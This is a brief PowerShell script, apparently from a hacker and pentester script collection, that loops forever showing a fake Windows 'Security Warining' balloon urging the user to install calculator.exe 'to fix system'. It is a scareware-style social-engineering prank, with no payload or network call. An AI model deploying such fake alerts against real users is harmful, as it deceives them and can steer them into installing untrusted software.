# send multiple messages with intervel of time 
# Visit : https://github.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters.git for more scripts 

function Show-Popup {
    param (
        [string]$Message
    )

    [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

    $popup = New-Object System.Windows.Forms.NotifyIcon
    $popup.Icon = [System.Drawing.SystemIcons]::Information
    $popup.BalloonTipIcon = 'Info'
    $popup.BalloonTipText = $Message
    $popup.BalloonTipTitle = 'Security Warining'
    $popup.Visible = $true
    $popup.ShowBalloonTip(10000)
    Start-Sleep -Seconds 10
    $popup.Dispose()
}

# Infinite loop to continuously display pop-ups
while ($true) {
    Show-Popup -Message "Please install the calculator.exe to fix system"
}


